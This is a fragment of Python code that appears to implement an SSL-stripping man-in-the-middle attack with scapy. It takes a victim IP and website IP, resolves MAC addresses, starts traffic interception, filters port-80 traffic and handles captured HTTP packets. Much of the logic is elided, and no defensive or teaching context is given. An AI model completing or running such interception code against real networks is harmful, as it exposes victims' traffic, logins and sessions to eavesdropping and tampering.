...
def run_ssl_strip(config: SSLStripConfig) -> None:
    ...
    print(f"[*] Victim: {config.victim_ip} <-> Website: {config.website_ip}")
    
    if not config.victim_ip or not config.website_ip:
        print("[-] Error: Victim IP and Website IP are required.")
        return
    ...
    print(f"[*] Resolved: Victim={victim_mac}, Website={gateway_mac}")
    start_intercept(config)
    
    # Filter for TCP traffic on port 80 involving our target
    bpf_filter = f"tcp port 80 and (host {config.victim_ip} or host {config.website_ip})"
...
def process_packet(pkt, config: SSLStripConfig, victim_mac: str, gateway_mac: str, my_mac: str) -> None:
    ...
    if pkt.haslayer(scapy.TCP) and pkt[scapy.TCP].dport == 80:
        print(f"[*] Caught HTTP Request to: {pkt[scapy.IP].dst}")
    ...
    elif pkt[scapy.IP].src == config.website_ip:
